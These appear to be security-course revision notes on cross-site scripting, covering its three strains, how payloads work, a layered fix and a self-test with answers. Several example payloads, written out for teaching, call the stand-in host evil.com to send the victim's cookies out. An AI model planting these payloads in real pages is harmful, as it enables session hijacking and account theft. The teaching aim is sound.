# Day 9 Revision Notes — Cross-Site Scripting (XSS)

**Roadmap phase:** Foundations
**Connects to:** Day 5 (Cookie flags — HttpOnly specifically), Day 8 (Injection, same root cause as SQLi), Day 13 (CSRF — often chained with XSS), Day 16 (Secure Coding fix)
**Revision date:** _______________

---

## The One Sentence Summary

> SQL injection corrupts a database query; XSS injects executable script into a page that other people's browsers will load and run — same root failure (untrusted input becoming live structure instead of staying inert data), different victim.

---

## 1. The Shared Root Cause With SQL Injection

Both vulnerabilities exist because user input was allowed to cross from "data" into "structure" without being kept separate. In SQL injection, the structure is a database query. In XSS, the structure is the HTML/JavaScript of a page. The fix in both cases follows the same shape: **encode or parameterize at the boundary where untrusted input meets a parser that would otherwise interpret it as commands.**

```
SQL injection:  user input → SQL query string  → database parses it as SQL
XSS:            user input → HTML page string  → browser parses it as HTML/JS
```

If you can explain SQLi clearly, you already understand XSS's mechanism — only the parser and the victim change.

---

## 2. The Three Strains, In Depth

### Reflected XSS
The payload lives entirely in the request — typically a URL parameter — and is echoed straight back into the response without being saved anywhere.
```
https://shop.com/search?q=<script>alert(1)</script>
```
If the search results page prints "Results for: [q]" without encoding the value first, the script executes the instant the link is opened. **The victim must click a specific crafted link** — this is why reflected XSS is almost always delivered via phishing, not discovered passively by a victim just browsing normally.

### Stored XSS
The payload is saved permanently — in a comment, a forum post, a user profile bio — and served to **every visitor** who later loads that page. No malicious link required; the infection is just sitting there.
```
A product review field saves: <script>fetch('//evil.com/?c='+document.cookie)</script>
```
This is the most dangerous of the three strains specifically because the blast radius scales with traffic, not with how many people click a link — and the payload persists until someone finds and removes it from the database.

### DOM-Based XSS
The entire vulnerable path lives in client-side JavaScript. The malicious data may never be sent to the server at all.
```js
// Vulnerable client-side code:
document.getElementById('greeting').innerHTML = location.hash.substring(1);
```
Visiting `page.html#<img src=x onerror=alert(1)>` triggers execution purely inside the browser — `location.hash` is read directly by JavaScript and written into the page via `innerHTML` without ever touching the backend. **This is why server-side input validation and server logs are structurally blind to DOM-based XSS** — the vulnerable code path doesn't go through the server at all.

---

## 3. Reading a Real Payload's Anatomy

```html
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

| Fragment | Role |
|---|---|
| `<img ... >` | A real HTML tag — needs to actually render as an element for the rest of the trick to work |
| `src=x` | A deliberately broken image source. `x` will never resolve to a real image |
| `onerror=` | An event handler attribute. Whatever JavaScript is assigned here runs the instant the corresponding event fires |
| `"fetch(...)"` | The actual payload — runs automatically, with zero user interaction, the moment the broken image fails to load |

**Why `<img onerror>` instead of a plain `<script>` tag**: some naive input filters only block the literal string "script." An `<img>` tag with a broken `src` and a hijacked `onerror` achieves the exact same code execution without that string appearing anywhere — a textbook example of why blocklist-based filtering fails.

---

## 4. What a Real Payload Actually Does (Beyond alert())

Tutorials use `alert('XSS')` purely as visible proof a payload executed. Real attacks almost never pop an alert, because a visible alert box immediately tells the victim something is wrong. Real payloads instead:

- **Steal the session**: `fetch('//evil.com/?c='+document.cookie)` silently sends the victim's session cookie to an attacker-controlled server, enabling full account takeover without ever needing a password
- **Keylog**: attach a hidden `keydown` listener that streams every keystroke off-page in the background
- **Rewrite the page**: inject a convincing fake login form directly over the real page to harvest credentials in real time
- **Self-propagate (worm behavior)**: on social platforms, have the payload repost itself to the victim's own profile or feed, infecting everyone who views *their* page next

---

## 5. The Fix — Three Layers

### Layer 1: Output Encoding (the actual fix)
```js
// VULNERABLE
div.innerHTML = userComment;

// FIXED
div.textContent = userComment;
// or, when HTML structure in user content must be preserved:
// HTML-encode < > & " ' before insertion
```
This is the real fix, not a mitigation. `textContent` (or equivalent server-side HTML-entity encoding) guarantees that angle brackets and quotes are displayed as literal characters rather than being parsed as markup — the injected payload simply can never become a live element in the first place.

### Layer 2: Content Security Policy (a safety net)
```http
Content-Security-Policy: script-src 'self'
```
Even if a payload somehow sneaks through encoding, a strict CSP can prevent it from executing or from phoning home to an attacker's domain. CSP doesn't fix the underlying injection — it limits what an attacker can do if one slips through.

### Layer 3: HttpOnly Cookies (damage limitation, not prevention)
```http
Set-Cookie: session=abc123; HttpOnly
```
This does not stop XSS at all. It limits what a *successful* XSS payload can do — specifically, it makes the session cookie unreadable to any JavaScript, injected or not, so even a working XSS exploit can't trivially read `document.cookie` and hijack the session.

**Why all three matter together**: encoding is the actual fix; CSP and HttpOnly are defense-in-depth for the cases where encoding was missed somewhere. A mature application has all three, not just one.

---

## 6. Self-Test — Don't Look Until You've Tried

1. An attacker posts a malicious script as a permanent forum comment. Every later visitor who views it gets infected without clicking anything. Which strain is this, and why does it scale with traffic rather than with link clicks?
2. A payload only works if the victim clicks a specific crafted URL, and nothing is ever saved server-side. Which strain, and why does this one specifically require social engineering to deliver?
3. Explain, mechanically, why `<img src=x onerror=alert(1)>` executes JavaScript without ever using a `<script>` tag.
4. Why are server-side logs and server-side input validation completely blind to DOM-based XSS?
5. Does the `HttpOnly` cookie flag prevent XSS from happening? If not, what does it actually do?
6. Why does `div.textContent = userInput` fix the vulnerability that `div.innerHTML = userInput` creates?

### Answers

1. Stored XSS. It scales with traffic because the payload is sitting in the database, served identically to every single visitor who loads that page — there's no "send a link to each victim" step required, unlike reflected XSS.
2. Reflected XSS. The payload lives entirely in the URL/request and is immediately echoed back — nothing is saved, so without a victim clicking that specific crafted link, there's no path to execution at all. This structural requirement is exactly why delivery depends on phishing.
3. The `src="x"` guarantees the browser's attempt to load the image fails. That failure fires the `onerror` event, and the attacker has placed arbitrary JavaScript directly inside that event handler — so the browser executes it automatically the moment the image fails to load, with no `<script>` tag and no user interaction needed.
4. Because the vulnerable code path is entirely client-side — JavaScript reads something like `location.hash` directly in the browser and writes it into the page without that data ever being sent to or processed by the server. There's nothing in a server log to flag, because the server was never involved.
5. No. HttpOnly does nothing to prevent the injection itself. What it does is make the session cookie unreadable to any JavaScript — including a successful attacker's injected script — which limits the damage (specifically, blocking the most common XSS payload goal of stealing the session cookie) even when the underlying XSS vulnerability still exists.
6. `textContent` always treats its input as plain text, displaying angle brackets and quotes as literal characters rather than parsing them as HTML. `innerHTML` parses its input as actual markup, so any tags or event-handler attributes inside user-supplied text become real, live, executing parts of the DOM.

---

## Quick Reference Card

```
ROOT CAUSE:        Untrusted input becomes live HTML/JS instead of staying inert text
                    (same shape of failure as SQL injection — different parser, different victim)

THREE STRAINS:
  Reflected         — lives in URL/request, one victim per crafted link clicked
  Stored             — lives in the database, every visitor is a victim
  DOM-based           — lives entirely in client JS, server never sees the malicious part

CLASSIC PAYLOADS:
  <script>alert(1)</script>
  <img src=x onerror=alert(document.cookie)>
  <svg onload=alert(1)>

WHY <img onerror> WORKS:    src=x deliberately fails to load -> onerror fires ->
                            attacker's JS runs, no <script> tag needed (defeats naive filters)

REAL GOALS (not alert()):  session/cookie theft, keylogging, fake-login overlay, self-propagation

THE FIX (3 layers):
  1. Output encoding  — textContent / HTML-entity-encode (the actual fix)
  2. CSP header        — script-src 'self' (safety net if encoding is missed)
  3. HttpOnly cookie     — doesn't stop XSS, limits damage if it succeeds

DOM-XSS BLIND SPOT:   server-side validation/logging can't see this — it never
                      touches the backend at all
```
